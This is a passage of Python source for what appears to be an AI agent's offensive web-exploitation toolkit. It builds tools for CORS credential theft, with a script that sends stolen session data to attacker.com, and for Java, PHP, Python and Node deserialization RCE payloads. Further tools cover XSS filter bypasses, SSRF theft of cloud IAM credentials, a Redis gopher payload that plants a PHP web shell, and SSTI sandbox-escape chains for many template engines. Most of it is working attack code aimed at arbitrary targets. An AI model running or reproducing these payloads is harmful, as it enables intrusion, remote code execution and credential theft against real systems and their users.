                       headers: dict = None, cookies: dict = None) -> str:
    """CORS misconfiguration: probe (detect reflection/null/subdomain), exploit (credential theft chain),
    subdomain_check (find takeable subdomains), preflight (complex request bypass)."""
    import urllib.parse as _up

    if operation == "probe":
        code = f"""
import requests, re
requests.packages.urllib3.disable_warnings()
url = {repr(target_url)}
hdrs = {repr(headers or {})}
cks = {repr(cookies or {})}
results = []

test_origins = [
    "https://evil.com",
    "null",
    "https://evil{repr(target_url).split('/')[2] if '/' in repr(target_url) else ''}.com",
    "https://{repr(target_url).split('/')[2].replace("'","") if '//' in target_url else 'example.com'}",
    "https://attacker.com",
]
parsed = re.search(r'https?://([^/]+)', url)
domain = parsed.group(1) if parsed else 'target.com'
test_origins.append(f"https://{{domain}}.evil.com")
test_origins.append(f"https://evil.{{domain}}")
test_origins.append(f"http://{{domain}}")  # http downgrade

for orig in test_origins:
    try:
        r = requests.get(url, headers={{**hdrs, 'Origin': orig}}, cookies=cks,
                         timeout=8, verify=False, allow_redirects=True)
        acao = r.headers.get('Access-Control-Allow-Origin','')
        acac = r.headers.get('Access-Control-Allow-Credentials','')
        acah = r.headers.get('Access-Control-Allow-Headers','')
        if acao:
            vuln = ''
            if acao == orig or acao == '*':
                if acac.lower() == 'true':
                    vuln = ' *** CRITICAL: ACAO reflects + credentials=true ***'
                elif acao == orig:
                    vuln = ' [ACAO reflects origin]'
                elif acao == '*':
                    vuln = ' [wildcard, no credentials]'
            results.append(f"Origin: {{orig[:50]}}\\n  ACAO: {{acao}} ACAC: {{acac}}{{vuln}}")
    except Exception as ex:
        results.append(f"Origin: {{orig}} -> error: {{ex}}")

print('\\n'.join(results) if results else 'No CORS headers detected')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "exploit":
        victim_origin = origin or target_url.split('/')[0] + '//' + (target_url.split('/')[2] if '//' in target_url else 'target.com')
        return (f"CORS credential theft PoC (host on attacker.com):\n\n"
                f"<script>\nfetch('{target_url}', {{\n"
                f"  method: 'GET',\n  credentials: 'include',\n  mode: 'cors'\n}})\n"
                f".then(r => r.text())\n"
                f".then(data => {{\n"
                f"  fetch('https://attacker.com/steal?d=' + btoa(data));\n"
                f"}});\n</script>\n\n"
                f"If ACAO reflects origin + ACAC: true → all cookies/session data exfiltrated.\n"
                f"For POST with JSON body, add: headers: {{'Content-Type': 'application/json'}}\n"
                f"For preflight bypass: use text/plain or form-urlencoded Content-Type.")

    if operation == "subdomain_check":
        code = f"""
import requests, socket, itertools
requests.packages.urllib3.disable_warnings()
import re
parsed = re.search(r'https?://([^/]+)', {repr(target_url)})
domain = parsed.group(1) if parsed else {repr(target_url)}
parts = domain.split('.')
if len(parts) >= 2:
    root = '.'.join(parts[-2:])
else:
    root = domain
prefixes = ['www','api','dev','staging','beta','test','app','admin','portal',
            'cdn','static','assets','media','img','mail','smtp','ftp','vpn']
print(f"Checking subdomains of {{root}} for potential CORS origin confusion...")
for p in prefixes:
    sub = f"{{p}}.{{root}}"
    try:
        socket.gethostbyname(sub)
        r = requests.get(f"https://{{sub}}", timeout=3, verify=False)
        print(f"  ALIVE: {{sub}} ({{r.status_code}})")
    except socket.gaierror:
        print(f"  DEAD (potential takeover): {{sub}}")
    except Exception as ex:
        print(f"  ERROR: {{sub}} -> {{ex}}")
"""
        return tool_execute_python(code, timeout=40)

    if operation == "preflight":
        return f"[preflight] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: probe, exploit, subdomain_check, preflight"


def tool_deserialization_exploit(language: str, operation: str = "list",
                                  gadget_chain: str = "", command: str = "id",
                                  output_format: str = "base64",
                                  extra_args: str = "") -> str:
    """Java ysoserial + PHP phpggc deserialization payloads. language=java|php|python|ruby|node."""
    lang = language.lower()

    if lang == "java":
        if operation == "list":
            out = _shell("java -jar /opt/ysoserial/ysoserial.jar 2>&1 | head -40 || "
                         "ysoserial 2>&1 | head -40 || "
                         "docker run --rm frohoff/ysoserial 2>&1 | head -40")
            if "not found" in out.lower() or "no such" in out.lower():
                return ("ysoserial not found. Install options:\n"
                        "  docker pull frohoff/ysoserial\n"
                        "  wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar\n"
                        "  -O /opt/ysoserial/ysoserial.jar\n\n"
                        "Known gadget chains (built-in reference):\n"
                        "  CommonsCollections1-7, Spring1-2, Hibernate1-2,\n"
                        "  BeanShell1, Clojure, FileUpload1, Groovy1,\n"
                        "  JBossInterceptors1, JavassistWeld1, JRMPClient,\n"
                        "  JRMPListener, JSON1, MozillaRhino1-2, Myfaces1-2,\n"
                        "  ROME, Spring1-2, Vaadin1, Wicket1")
            return out
        if operation in ("generate", "payload"):
            if not gadget_chain: return "Provide gadget_chain (e.g. CommonsCollections1)"
            cmd_escaped = command.replace("'", "\\'").replace('"', '\\"')
            jar_cmd = (f"java -jar /opt/ysoserial/ysoserial.jar '{gadget_chain}' '{cmd_escaped}' 2>/dev/null | "
                       f"{'base64 -w0' if output_format=='base64' else 'xxd | head -20'}")
            out = _shell(jar_cmd, timeout=30)
            if not out.strip():
                # Try docker fallback
                out = _shell(f"docker run --rm frohoff/ysoserial '{gadget_chain}' '{cmd_escaped}' 2>/dev/null | "
                             f"{'base64 -w0' if output_format=='base64' else 'xxd | head -20'}", timeout=30)
            if not out.strip():
                return (f"ysoserial payload generation failed for {gadget_chain}.\n"
                        f"Manual pwntools-style snippet:\n"
                        f"  # Ensure ysoserial.jar is present at /opt/ysoserial/ysoserial.jar\n"
                        f"  payload = subprocess.check_output(['java','-jar','/opt/ysoserial/ysoserial.jar',\n"
                        f"    '{gadget_chain}', '{cmd_escaped}'])\n"
                        f"  # Then send as POST body with Content-Type: application/x-java-serialized-object")
            return f"Payload ({gadget_chain} → {command}):\n{out}"
        if operation == "detect":
            return ("Java deserialization detection patterns:\n"
                    "  Magic bytes: AC ED 00 05 (hex) = rO0AB (base64 prefix)\n"
                    "  HTTP headers: Content-Type: application/x-java-serialized-object\n"
                    "  Endpoints: /invoker/JMXInvokerServlet, ViewState, remoting\n"
                    "  Tools: ysoserial-all.jar for exploitation, SerializationDumper for analysis\n"
                    "  GadgetProbe to detect which chains are available remotely")

    if lang == "php":
        if operation == "list":
            out = _shell("phpggc -l 2>/dev/null | head -60 || php /opt/phpggc/phpggc -l 2>/dev/null | head -60")
            if "not found" in out.lower() or not out.strip():
                return ("phpggc not found. Install:\n"
                        "  git clone https://github.com/ambionics/phpggc /opt/phpggc\n\n"
                        "Major framework chains (built-in reference):\n"
                        "  Laravel/RCE1-8, Symfony/RCE1-9, Yii/RCE1-2,\n"
                        "  Drupal/RCE1, Guzzle/RCE1-2, Monolog/RCE1-8,\n"
                        "  SwiftMailer/FW1, CakePHP/RCE1, Wordpress/RCE1,\n"
                        "  Slim/RCE1, Laminas/RCE1-2, PHPCSFixer/RCE1")
            return out
        if operation in ("generate", "payload"):
            if not gadget_chain: return "Provide gadget_chain (e.g. Laravel/RCE1)"
            cmd_escaped = shlex.quote(command) if hasattr(shlex := __import__('shlex'), 'quote') else f"'{command}'"
            fmt_flag = "--fast-destruct" if "FD" in extra_args else ""
            enc_flag = "-b" if output_format == "base64" else ""
            cmd_str = (f"phpggc {fmt_flag} {enc_flag} '{gadget_chain}' system {cmd_escaped} 2>/dev/null || "
                       f"php /opt/phpggc/phpggc {fmt_flag} {enc_flag} '{gadget_chain}' system {cmd_escaped} 2>/dev/null")
            out = _shell(cmd_str, timeout=20)
            if not out.strip():
                return (f"phpggc payload generation failed for {gadget_chain}.\n"
                        f"Manual:\n  cd /opt/phpggc && php phpggc {gadget_chain} system '{command}' {enc_flag}")
            return f"PHP payload ({gadget_chain} → {command}):\n{out}"

    if lang == "python":
        code = f"""
import pickle, os, base64, subprocess
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('{command}',))
payload = pickle.dumps(Exploit())
print("Pickle payload (hex):", payload.hex())
print("Pickle payload (b64):", base64.b64encode(payload).decode())
print("Length:", len(payload), "bytes")
print()
# Safer exec variant (captures output)
class ExploitCapture(object):
    def __reduce__(self):
        cmd = {repr(command)}
        return (subprocess.check_output, (['/bin/sh', '-c', cmd],))
payload2 = pickle.dumps(ExploitCapture())
print("Capture variant (b64):", base64.b64encode(payload2).decode())
"""
        return tool_execute_python(code)

    if lang == "ruby":
        return ("Ruby Marshal deserialization exploit skeleton:\n"
                "  # Requires a writeable gadget chain in loaded gems\n"
                "  # Universal approach: use universal-ooze or pry\n"
                "  # https://github.com/httpvoid/rails-rce\n\n"
                "  require 'erb'\n  require 'base64'\n"
                "  payload = ERB.new('<%= `" + command + "` %>').result\n"
                "  # Wrap in ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\n"
                "  # or use rails-rce gem: rails_rce.generate('" + command + "')")

    if lang == "node":
        return ("Node.js deserialization exploit (node-serialize):\n"
                f'  var serialize = require("node-serialize");\n'
                f'  var payload = {{"rce": "_$$ND_FUNC$$_function(){{require(\'child_process\')'
                f'.exec(\'{command}\', function(e,s,_){{console.log(s)}})}}()"}}\n'
                f'  console.log(serialize.serialize(payload));  // URL-encode for cookie/param\n\n'
                "  Detection: look for unserialize() calls in node-serialize or funcster packages")

    return f"Unsupported language: {language}. Supported: java, php, python, ruby, node"


def tool_dom_xss(operation: str = "analyze", url_or_path: str = "",
                  html_content: str = "", sink: str = "",
                  extra_payloads: str = "") -> str:
    """DOM XSS: analyze (find sinks in JS), payloads (engine-specific bypass chains),
    dom_clobbering (clobber id/name attributes), mutation_xss (mXSS parser confusion),
    csp_bypass (dangling markup, JSONP, open redirects), prototype_pollution_xss."""

    # DOM_SINKS/SOURCES removed - Claude knows these

    if operation == "analyze":
        target = url_or_path or html_content
        if not target:
            return "Provide url_or_path or html_content"
        code = f"""
import re, sys
try:
    import requests
    requests.packages.urllib3.disable_warnings()
    if {repr(url_or_path)}.startswith('http'):
        r = requests.get({repr(url_or_path)}, timeout=10, verify=False)
        src = r.text
        # Also fetch linked JS
        js_urls = re.findall(r'<script[^>]+src=[\'"]([^\'"]+)[\'"]', src)
        for js_url in js_urls[:5]:
            try:
                if not js_url.startswith('http'):
                    base = '/'.join({repr(url_or_path)}.split('/')[:3])
                    js_url = base + '/' + js_url.lstrip('/')
                jr = requests.get(js_url, timeout=5, verify=False)
                src += '\\n' + jr.text
            except: pass
    else:
        src = {repr(html_content)} or open({repr(url_or_path)}).read()
except Exception as ex:
    src = {repr(html_content)}
    print(f"Fetch error: {{ex}}")

SINKS = ['innerHTML','outerHTML','document.write','document.writeln','eval(','setTimeout(',
         'setInterval(','location.href','location.assign','location.replace',
         '.src =','.href =','.action =','insertAdjacentHTML','createContextualFragment',
         'dangerouslySetInnerHTML','v-html','ng-bind-html','$sce.trustAsHtml']
SOURCES = ['location.hash','location.search','location.href','document.referrer',
           'document.URL','window.name','postMessage','localStorage','sessionStorage','getItem(']

print("=== DOM Sink Analysis ===")
lines = src.split('\\n')
for i, line in enumerate(lines, 1):
    for sink in SINKS:
        if sink in line:
            # Check if a source feeds into it nearby
            context = '\\n'.join(lines[max(0,i-5):i+3])
            source_nearby = [s for s in SOURCES if s in context]
            flag = ' *** SOURCE NEARBY ***' if source_nearby else ''
            print(f"L{{i}}: [SINK: {{sink}}]{{flag}}")
            print(f"  {{line.strip()[:120]}}")
            if source_nearby: print(f"  Sources: {{source_nearby}}")
            break

print("\\n=== Dangerous Patterns ===")
danger_patterns = [
    (r'eval\\s*\\(.*location', 'eval(location.*)'),
    (r'innerHTML.*location', 'innerHTML ← location'),
    (r'document\\.write.*location', 'document.write ← location'),
    (r'window\\[.*\\]\\s*\\(', 'window[computed]() call'),
    (r'new\\s+Function\\s*\\(', 'new Function() constructor'),
    (r'\\$\\(.*location', 'jQuery(location.*)'),
    (r'postMessage.*function', 'postMessage handler'),
]
for pattern, label in danger_patterns:
    matches = re.findall(f'.{{0,40}}{pattern}.{{0,40}}', src, re.IGNORECASE)
    if matches:
        print(f"  {{label}}: {{len(matches)}} occurrence(s)")
        for m in matches[:2]: print(f"    {{m.strip()[:100]}}")
"""
        return tool_execute_python(code, timeout=30)

    if operation == "payloads":
        target_sink = sink or "innerHTML"
        payloads = DOM_SINKS.get(target_sink, DOM_SINKS["innerHTML"])
        lines = [f"=== DOM XSS payloads for sink: {target_sink} ===\n"]
        for p in payloads:
            lines.append(f"  {p}")
        lines.append(f"\nTrigger sources to test: {', '.join(SOURCES[:5])}")
        lines.append("\nEncoded variants (filter bypass):")
        lines.append("  <img src=x onerror=\\u0061lert(1)>  (unicode escape)")
        lines.append("  <img src=x onerror=eval(atob('YWxlcnQoMSk='))>  (base64)")
        lines.append("  <svg><animate onbegin=alert(1) attributeName=x>")
        lines.append("  <details open ontoggle=alert(1)>")
        lines.append("  <input autofocus onfocus=alert(1)>")
        lines.append("  attribute break-out payload")
        lines.append("\njavascript: URI bypasses:")
        lines.append("  java&#x09;script:alert(1)  (tab character)")
        lines.append("  java\\x0ascript:alert(1)   (newline)")
        lines.append("  &#106;avascript:alert(1)   (entity)")
        return "\n".join(lines)

    if operation == "dom_clobbering":
        return f"[dom_clobbering] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "mutation_xss":
        return f"[mutation_xss] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "csp_bypass":
        return f"[csp_bypass] Claude handles this directly — use execute_python/execute_shell to run the technique"

    if operation == "prototype_pollution_xss":
        return f"[prototype_pollution_xss] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: analyze, payloads, dom_clobbering, mutation_xss, csp_bypass, prototype_pollution_xss"


def tool_ssrf_chain(target_url: str, operation: str = "probe",
                     param: str = "url", method: str = "GET",
                     headers: dict = None, cookies: dict = None,
                     internal_target: str = "", custom_payload: str = "") -> str:
    """SSRF automated exploitation: probe (detect), cloud_metadata (AWS/GCP/Azure IMDS),
    port_scan (internal), protocol_smuggle (gopher/dict/file), redis_rce, escalate (full chain)."""

    # CLOUD_PAYLOADS/BYPASS_SCHEMES removed - Claude generates these

    if operation == "probe":
        code = f"""
import requests, time
requests.packages.urllib3.disable_warnings()
url = {repr(target_url)}
param = {repr(param)}
method = {repr(method.upper())}
hdrs = {repr(headers or {})}
cks = {repr(cookies or {})}
results = []

payloads = [
    ("http://169.254.169.254/latest/meta-data/", "AWS IMDS v1"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance", "Azure IMDS"),
    ("http://127.0.0.1", "localhost"),
    ("http://127.0.0.1:6379", "Redis"),
    ("http://127.0.0.1:9200", "Elasticsearch"),
    ("http://127.0.0.1:8080", "Internal web"),
    ("file:///etc/passwd", "file:// LFI"),
    ("dict://127.0.0.1:6379/info", "Dict-Redis"),
]

for ssrf_url, label in payloads:
    try:
        if method == 'GET':
            sep = '&' if '?' in url else '?'
            r = requests.get(url + sep + param + '=' + ssrf_url,
                             headers=hdrs, cookies=cks, timeout=5, verify=False)
        else:
            r = requests.post(url, data={{param: ssrf_url}},
                              headers=hdrs, cookies=cks, timeout=5, verify=False)
        body = r.text[:300]
        if any(x in body.lower() for x in ['ami-id','instance-id','computemetadata',
                                              'principalid','root:','redis_version',
                                              'elasticsearch','took']):
            results.append(f"[HIT] {{label}}: {{repr(body[:200])}}")
        elif r.status_code not in (403,404,400,502,504):
            results.append(f"[?] {{label}}: status={{r.status_code}} len={{len(r.text)}}")
    except requests.exceptions.Timeout:
        results.append(f"[TIMEOUT] {{label}} (possible blind SSRF)")
    except Exception as ex:
        results.append(f"[ERR] {{label}}: {{ex}}")
print('\\n'.join(results) if results else 'No SSRF detected')
"""
        return tool_execute_python(code, timeout=45)

    if operation == "cloud_metadata":
        cloud = custom_payload or "aws_v1"
        payload_url = CLOUD_PAYLOADS.get(cloud, CLOUD_PAYLOADS["aws_v1"])
        code = f"""
import requests
requests.packages.urllib3.disable_warnings()
url={repr(target_url)}; param={repr(param)}; method={repr(method.upper())}
hdrs={repr(headers or {})}; cks={repr(cookies or {})}
# Try multiple cloud metadata endpoints
endpoints = {{
    "AWS IMDSv1 root": "http://169.254.169.254/latest/meta-data/",
    "AWS IAM creds": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "AWS user-data": "http://169.254.169.254/latest/user-data",
    "GCP token": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "GCP full": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
    "Azure instance": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
}}
for label, ep in endpoints.items():
    try:
        extra_hdrs = {{'Metadata': 'true', 'X-aws-ec2-metadata-token-ttl-seconds': '21600'}}
        if method == 'GET':
            sep = '&' if '?' in url else '?'
            r = requests.get(url + sep + param + '=' + ep,
                             headers={{**hdrs,**extra_hdrs}}, cookies=cks, timeout=8, verify=False)
        else:
            r = requests.post(url, data={{param: ep}}, headers={{**hdrs,**extra_hdrs}}, cookies=cks, timeout=8, verify=False)
        if r.status_code == 200 and len(r.text) > 10:
            print(f"[HIT] {{label}}:\\n{{r.text[:500]}}")
    except Exception as ex:
        print(f"[ERR] {{label}}: {{ex}}")
"""
        return tool_execute_python(code, timeout=40)

    if operation == "port_scan":
        base = internal_target or "127.0.0.1"
        common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017, 11211, 2181, 5601, 4444]
        code = f"""
import requests, time
requests.packages.urllib3.disable_warnings()
url={repr(target_url)}; param={repr(param)}; method={repr(method.upper())}
hdrs={repr(headers or {})}; cks={repr(cookies or {})}
base={repr(base)}; ports={common_ports}
open_ports = []
for port in ports:
    target = f"http://{{base}}:{{port}}"
    try:
        start = time.time()
        if method == 'GET':
            sep = '&' if '?' in url else '?'
            r = requests.get(url + sep + param + '=' + target,
                             headers=hdrs, cookies=cks, timeout=3, verify=False)
        else:
            r = requests.post(url, data={{param: target}}, headers=hdrs, cookies=cks, timeout=3, verify=False)
        elapsed = time.time() - start
        if r.status_code not in (502,504) or elapsed < 2.5:
            open_ports.append(f"{{port}}: status={{r.status_code}} time={{elapsed:.2f}}s len={{len(r.text)}}")
    except requests.exceptions.Timeout:
        pass
    except Exception as ex:
        pass
print(f"Open/responsive ports on {{base}}:")
for p in open_ports: print(f"  {{p}}")
if not open_ports: print("No open ports found with SSRF probe")
"""
        return tool_execute_python(code, timeout=60)

    if operation == "redis_rce":
        cmd = custom_payload or "id"
        webshell_path = "/var/www/html/shell.php"
        gopher = ("gopher://127.0.0.1:6379/_"
                  "%2A1%0D%0A%248%0D%0Aflushall%0D%0A"
                  "%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%0A%0A%0D%0A"
                  "%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/var/www/html%0D%0A"
                  "%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A"
                  "%2A1%0D%0A%244%0D%0Asave%0D%0A")
        return (f"Redis SSRF→RCE via Gopher protocol:\n\n"
                f"Step 1: Send gopher payload via SSRF param:\n"
                f"  {param}={gopher}\n\n"
                f"Step 2: Execute command:\n"
                f"  GET {webshell_path.replace('/var/www/html','http://target')}?c={cmd}\n\n"
                f"Alternative: dict:// probe first:\n"
                f"  {param}=dict://127.0.0.1:6379/info\n\n"
                f"Memcached SSRF: gopher://127.0.0.1:11211/_stats\n"
                f"Elasticsearch: http://127.0.0.1:9200/_cat/indices")

    if operation == "protocol_smuggle":
        return f"[protocol_smuggle] Claude handles this directly — use execute_python/execute_shell to run the technique"

    return "Operations: probe, cloud_metadata, port_scan, redis_rce, protocol_smuggle"


def tool_ssti_rce(operation: str = "detect", engine: str = "auto",
                   target_url: str = "", param: str = "", method: str = "GET",
                   headers: dict = None, cookies: dict = None,
                   custom_payload: str = "") -> str:
    """SSTI detection + engine-specific RCE escalation with sandbox escape chains."""

    # ── Detection payloads (polymath probes) ─────────────────────────────────
    PROBES = [
        ("{{7*7}}", "49"),          # Jinja2/Twig/Tornado
        ("#{7*7}", "49"),           # Ruby ERB, Mako
        ("${7*7}", "49"),           # FreeMarker, Velocity
        ("{{7*'7'}}", "7777777"),   # Jinja2 (not Twig → 49)
        ("<%=7*7%>", "49"),         # ERB
        ("<#assign x=7*7>${x}", "49"),  # FreeMarker
        ("#set($x=7*7)${x}", "49"), # Velocity
        ("[#assign x=7*7][${x}]", "[49]"),  # FreeMarker (alt)
    ]

    ENGINE_RCE = {
        "jinja2": [
            # Classic MRO chain
            "{{''.__class__.__mro__[1].__subclasses__()[<N>].__init__.__globals__['os'].popen('{cmd}').read()}}",
            # config object (Flask)
            "{{config.__class__.__init__.__globals__['os'].popen('{cmd}').read()}}",
            # cycler (Jinja2 ≥ 2.11)
            "{{cycler.__init__.__globals__.os.popen('{cmd}').read()}}",
            # joiner
            "{{joiner.__init__.__globals__.os.popen('{cmd}').read()}}",
            # namespace (Jinja2 ≥ 2.10)
            "{{namespace.__init__.__globals__.os.popen('{cmd}').read()}}",
            # Bypass with request.application (Flask)
            "{{request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()}}",
            # attr filter bypass for dot-filtered input
            "{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|...|attr('popen')('{cmd}')|attr('read')()}}",
            # [].__class__.__base__ path for older Jinja
            "{{[].__class__.__base__.__subclasses__()[<N>]('ls',shell=True,stdout=-1).communicate()}}",
        ],
        "jinja2_sandbox": [
            # Sandbox escapes (filter bypasses)
            # lipsum function (built-in globals exposure)
            "{{lipsum.__globals__.os.popen('{cmd}').read()}}",
            # _getframe / sys bypass
            "{{().__class__.__mro__[1].__subclasses__()[<N>].__init__.__globals__['__builtins__']['__import__']('os').popen('{cmd}').read()}}",
            # Format string bypass for underscores
            "{{'%c'|format(95)*2 ~ 'class' ~ '%c'|format(95)*2}}",
            # Bypass with |string|list|... chains when . and _ filtered
            "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|...|attr('popen')('{cmd}')}}",
            # Werkzeug dev server console
            "# Werkzeug debug PIN bypass: check stderr for PIN, use /console",
        ],
        "twig": [
            "{{['id']|filter('system')}}",
            "{{['id','0']|sort('system')}}",
            "{{app.request.server.get('HTTP_ACCEPT_LANGUAGE')}}",  # info leak
            "{{'id'|exec}}",
            "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('{cmd}')}}",
            "{{['{cmd}']|map('system')}}",  # Twig 3.x
        ],
        "freemarker": [
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ex('{cmd}')}}",
            "${{\"freemarker.template.utility.ObjectConstructor\"?new()(\"java.lang.Runtime\").exec('{cmd}')}}",
            # API exposure via ?api
            "${{product?api.getClass().forName('java.lang.Runtime').getMethod('exec',String.class).invoke(product?api.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'{cmd}')}}",
        ],
        "velocity": [
            "#set($rt=$class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('{cmd}'))#set($exout=$ex.getInputStream())#set($bytes=[])$exout.read($bytes)",
            "#set($x='')##\n#set($rt=$x.class.forName('java.lang.Runtime'))...",
            "#foreach($i in [1..$out.class.forName('java.lang.Runtime').getRuntime().exec('{cmd}')])",
        ],
        "mako": [
            "${{__import__('os').popen('{cmd}').read()}}",
            "<%\nimport os\nx=os.popen('{cmd}').read()\n%>${{x}}",
            "${{self.module.__builtins__.__import__('os').popen('{cmd}').read()}}",
        ],
        "erb": [
            "<%= `{cmd}` %>",
            "<%= IO.popen('{cmd}').read %>",
            "<%= system('{cmd}') %>",
        ],
        "tornado": [
            "{{% import os %}}{{{{{{% raw os.popen('{cmd}').read() %}}}}}}",
            "{{{{escape.xhtml_escape.__globals__['os'].popen('{cmd}').read()}}}}",
        ],
        "smarty": [
            "{system('{cmd}')}",
            "{php}echo `{cmd}`;{/php}",
            "{{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php system('{cmd}');?>\",self::clearConfig())}}",
        ],
        "handlebars": [
            # Handlebars prototype pollution → RCE
            "{{{{#with \"s\" as |string|}}}}\n  {{{{#with \"e\"}}}}\n    {{{{#with split as |conslist|}}}}\n      {{{{this.pop}}}}\n      {{{{this.push (lookup string.sub \"constructor\")}}}}\n      {{{{this.pop}}}}\n      {{{{#with string.split as |codelist|}}}}\n        {{{{this.pop}}}}\n        {{{{this.push \"return require('child_process').execSync('{cmd}').toString();\"}}}}\n        {{{{this.pop}}}}\n        {{{{#each conslist}}}}\n          {{{{#with (string.sub.apply 0 codelist)}}}}\n            {{{{this}}}}\n          {{{{/with}}}}\n        {{{{/each}}}}\n      {{{{/with}}}}\n    {{{{/with}}}}\n  {{{{/with}}}}\n{{{{/with}}}}",
        ],
        "pebble": [
            "{{% set cmd = '{cmd}' %}}{{% set rt = ''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null) %}}{{% set p = rt.exec(cmd) %}}...",
        ],
    }

    cmd = "id"  # default probe command

    if operation == "payloads":
        eng = engine.lower() if engine != "auto" else "jinja2"
        chains = ENGINE_RCE.get(eng, ENGINE_RCE.get("jinja2", []))
        lines = [f"=== SSTI RCE payloads for {eng} (cmd='{custom_payload or cmd}') ==="]
        cmd_val = custom_payload or cmd
        for i, p in enumerate(chains, 1):
            lines.append(f"\n[{i}] {p.replace('{cmd}', cmd_val)}")
        lines.append("\n=== Engine detection probes ===")
        for probe, expected in PROBES[:5]:
            lines.append(f"  Inject: {probe}  → expect: {expected}")
        return "\n".join(lines)

    if operation == "detect" and target_url:
        results = []
        import urllib.parse as _up
        hdrs = headers or {}
        cks = cookies or {}
        detected_engine = None
        for probe, expected in PROBES:
            probe_url = target_url
            probe_data = None
            if param:
                if method.upper() == "GET":
                    sep = "&" if "?" in target_url else "?"
                    probe_url = target_url + sep + param + "=" + _up.quote(probe)
                else:
                    probe_data = {param: probe}
            try:
                resp = tool_http_request(probe_url, method, hdrs, probe_data, None, cks,
                                         follow_redirects=True, verify_ssl=False, timeout=10)
                if expected in resp:
                    results.append(f"[VULNERABLE] Probe '{probe}' → expected '{expected}' found!")
                    # Fingerprint engine
                    if probe == "{{7*'7'}}" and "7777777" in resp:
                        detected_engine = "jinja2"
                    elif probe == "{{7*'7'}}" and "49" in resp:
                        detected_engine = "twig"
                    elif probe == "${7*7}" and "49" in resp:
                        detected_engine = "freemarker_or_velocity"
                    elif probe == "<%=7*7%>" and "49" in resp:
                        detected_engine = "erb"
                    break
                else:
                    results.append(f"  Probe '{probe}' → no match (got {len(resp)} bytes)")
            except Exception as ex:
                results.append(f"  Probe '{probe}' → error: {ex}")
        if detected_engine:
            results.append(f"\nDetected engine: {detected_engine}")
            results.append(f"Use operation='escalate', engine='{detected_engine}' to get RCE payloads")
        return "\n".join(results) or "No SSTI detected with standard probes"

    if operation == "escalate":
        eng = engine.lower() if engine != "auto" else "jinja2"
        cmd_val = custom_payload or "id"
        chains = ENGINE_RCE.get(eng, [])
        if not chains:
            # fuzzy match
            for key in ENGINE_RCE:
                if key.startswith(eng[:4]):
                    chains = ENGINE_RCE[key]; eng = key; break
        if not chains:
            return f"No RCE chains for engine '{engine}'. Available: {list(ENGINE_RCE.keys())}"
        lines = [f"=== {eng} RCE escalation chains (cmd='{cmd_val}') ===",
                 "Try each payload in order — earlier ones work on unpatched installs,",
                 "later ones bypass common WAF/filters:\n"]
        for i, chain in enumerate(chains, 1):
            lines.append(f"[{i}] {chain.replace('{cmd}', cmd_val)}\n")
        # Add subclass finder for Jinja2
        if "jinja2" in eng:
            lines.append("\n=== Jinja2 subclass index finder (paste into SSTI) ===")
            lines.append("{{''.__class__.__mro__[1].__subclasses__()}}")
            lines.append("# Find Popen/subprocess index with:")
            lines.append("{% for i, c in enumerate(''.__class__.__mro__[1].__subclasses__()) %}")
            lines.append("  {% if 'Popen' in c.__name__ or 'subprocess' in c.__module__ %}")
            lines.append("    {{i}}: {{c}}")
            lines.append("  {% endif %}{% endfor %}")
        return "\n".join(lines)

    if operation == "list_engines":
        return "Supported engines: " + ", ".join(ENGINE_RCE.keys())

    return (f"SSTI RCE tool. Operations:\n"
            f"  detect   — probe URL for SSTI (requires target_url + param)\n"
            f"  escalate — get RCE chains for a known engine (requires engine=)\n"
            f"  payloads — dump all payloads for engine without making requests\n"
            f"  list_engines — list supported template engines\n"
            f"Supported engines: {', '.join(ENGINE_RCE.keys())}")


def tool_swagger_fuzz(target_url: str, operation: str = "discover",
                      endpoint: str = "", method: str = "GET",
                      output_path: str = "", headers: dict = None,
                      cookies: dict = None) -> str:
    """Fetch and parse OpenAPI/Swagger specs, enumerate all endpoints, test each for
    sensitive data exposure. Covers Spring Boot Actuator (/heapdump, /env, /beans).
    Ops: discover (probe common spec paths), parse_spec (list all paths+methods),
    test_all (call every GET endpoint), download_artifact (stream binary to file)."""

    import urllib.request

    base = target_url.rstrip("/")
    hdrs = headers or {}
    cks  = cookies or {}

    SPEC_PATHS = [
        "/api-docs", "/v2/api-docs", "/v3/api-docs",
        "/swagger.json", "/swagger.yaml",
        "/openapi.json", "/openapi.yaml",
        "/swagger-ui/swagger.json",
        "/actuator", "/actuator/mappings",
        "/api/swagger.json", "/api/openapi.json",
    ]

    def _get(url, stream=False):
        try:
            import requests
            r = requests.get(url, headers=hdrs, cookies=cks,
                             timeout=10, verify=False, stream=stream)
            return r
        except ImportError:
            pass
        try:
            req = urllib.request.Request(url, headers=hdrs)
            with urllib.request.urlopen(req, timeout=10) as r:
                return type("R", (), {
                    "status_code": r.status,
